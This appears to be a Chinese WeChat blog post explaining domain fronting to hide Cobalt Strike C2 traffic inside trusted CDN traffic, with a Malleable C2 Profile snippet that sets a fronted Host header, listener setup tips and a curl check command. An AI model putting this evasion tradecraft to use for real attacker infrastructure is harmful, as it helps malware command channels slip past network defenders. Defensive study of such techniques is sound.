---
title: 对抗封锁-域前置C2
url: https://mp.weixin.qq.com/s/fYMdk2YhoLAvG7q7-3IvAg
source: Doonsec's feed
date: 2026-11-22
fetch_date: 2026-11-23T10:01:42.484837
---

# 对抗封锁-域前置C2

# 对抗封锁-域前置C2

原创

花鸟
花鸟

花鸟在线

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_jpg/G9vCzJwRv8S3MDECGicnvOqSHxUG7XAXM5ZyYb6s1gRrBsxL607ccYrZcJqQlw9oNZLV5rB5jDjY9LcRFymJMzNpVIY1XzxgFC2ylaQmsVicQ/640?wx_fmt=jpeg&from=appmsg)

逃逸思路：让外部的审查设备在连接建立阶段只能看到一个被放行的域名，而真实目标域名隐藏在加密隧道内。

利用场景（一句话）：规避审查与隐蔽通信：据说最初被用于绕过互联网审查，后也常被用于隐藏恶意C2服务器，使其通信流量混入合法 CDN 流量中，增加检测难度。

核心原理（从建立的请求报文角度理解）：

-->TLS 服务器名称指示（SNI，明文阶段）：当受控端与攻击端建立加密连接时，SNI 字段会以明文形式暴露在外层。在域前置中，这里填写的是一个无害、高信誉的域名（比如大型云服务商或合法网站的域名）。网络审查者在这一步只能看到这个“幌子”域名，通常会选择放行，或策略受信。

-->HTTP Host 头（加密阶段）：在加密通道建立之后，客户端才会在内部发送真正的 HTTP 请求。此时，请求头中的 Host 字段填写的是真实要访问的受限或恶意域名。由于此时流量已经加密了，外部设备无法窥探到真实的 Host 内容。

配方：

在CS上，通过修改 Malleable C2 Profile 来实现:

```
http-get {
    set uri "/s/ref=nb_sb_noss_1/0262949/field-keywords=books";
    client {
        header "Accept" "*/*";        header "Host" "www.huaniao.com";
        metadata {            base64;            prepend "session-token=";            header "Cookie";        }    }
```

在监听器里，HTTPS Host 填写 高可信誉域名（幌子域名）。这样 Beacon 连接的是幌子域名，但 CDN 会把请求转给 真后端域名。

-->在进行配置 C2 之前，可以先用一条 curl 命令（curl -H "Host: 真实域名" https://高信誉域名/）做一次验证。如果 CDN 直接返回错误或拒绝连接，后面的 Profile 配置再精细也无法生效。

利用面：收宰了。由于滥用严重，谷歌、亚马逊、微软等主流云厂商已先后禁用了对其基础设施的域前置支持，会检测并拒绝 SNI 与 Host 头不一致的请求。因此对抗继续升级。

宿敌：永远要相信自己有软肋；盘夺你健康之徒。

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/LUFdknfa3USibnuy0Vpo6UXQvCbGAIj8xY31R2Kl75pIiafOVicDbts1OWUrAK1KhBXAdZdlTWDPKb65ts6oCNVIA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
推荐
，轻点两下取消推荐
分享
留言
收藏
听过